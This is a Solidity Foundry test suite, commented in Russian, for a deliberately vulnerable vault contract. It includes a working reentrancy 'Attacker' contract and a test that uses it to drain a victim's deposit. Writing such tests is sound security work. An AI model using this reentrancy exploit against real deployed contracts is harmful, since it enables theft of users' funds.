// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/VulnerableVault.sol";

// Встроенный атакующий контракт — только для тестов
contract Attacker {
    VulnerableVault public vault;
    uint256 public reentryCount;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
    }

    receive() external payable {
        // Ограничиваем количество повторных входов, чтобы не превысить лимит газа
        if (address(vault).balance >= 1 ether && reentryCount < 10) {
            reentryCount++;
            vault.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "need >=1 ether");
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract VulnerableVaultTest is Test {
    VulnerableVault vault;
    address user = address(0x1);

    function setUp() public {
        vault = new VulnerableVault();
    }

    // 1. Проверка депозита
    function testDeposit() public {
        vm.deal(user, 2 ether);
        vm.prank(user);
        vault.deposit{value: 1 ether}();

        assertEq(vault.balances(user), 1 ether);
        assertEq(address(vault).balance, 1 ether);
    }

    // 2. Проверка успешного вывода средств
    function testWithdraw() public {
        vm.deal(user, 1 ether);
        vm.prank(user);
        vault.deposit{value: 1 ether}();

        uint256 initialBalance = user.balance;
        vm.prank(user);
        vault.withdraw();

        assertEq(vault.balances(user), 0);
        assertEq(user.balance, initialBalance + 1 ether);
        assertEq(address(vault).balance, 0);
    }

    // 3. withdraw ревертится с сообщением "No balance", если баланс нулевой
    function testWithdrawRevertsIfNoBalance() public {
        vm.expectRevert("No balance");
        vault.withdraw();
    }

    // 4. Нельзя вывести средства дважды без атаки
    function testCannotWithdrawTwiceWithoutAttack() public {
        vm.deal(user, 1 ether);
        vm.prank(user);
        vault.deposit{value: 1 ether}();

        vm.prank(user);
        vault.withdraw();

        vm.prank(user);
        vm.expectRevert("No balance");
        vault.withdraw();
    }

    // 5. Reentrancy-атака успешно опустошает контракт
    function testReentrancyAttackDrainsVault() public {
        // Пополняем vault "жертвой"
        address victim = address(0x3);
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // Развертываем атакующий контракт
        Attacker attacker = new Attacker(address(vault));

        // Запускаем атаку
        vm.deal(address(attacker), 2 ether);
        attacker.attack{value: 1 ether}();

        // Vault должен быть пуст
        assertEq(address(vault).balance, 0);

        // Атакующий контракт получил почти все средства
        assertGt(attacker.getBalance(), 9 ether);
    }

    // 6. getBalance() возвращает корректный баланс контракта
    function testGetBalanceReturnsContractBalance() public {
        assertEq(vault.getBalance(), 0);

        vm.deal(user, 5 ether);
        vm.prank(user);
        vault.deposit{value: 5 ether}();

        assertEq(vault.getBalance(), 5 ether);
    }
}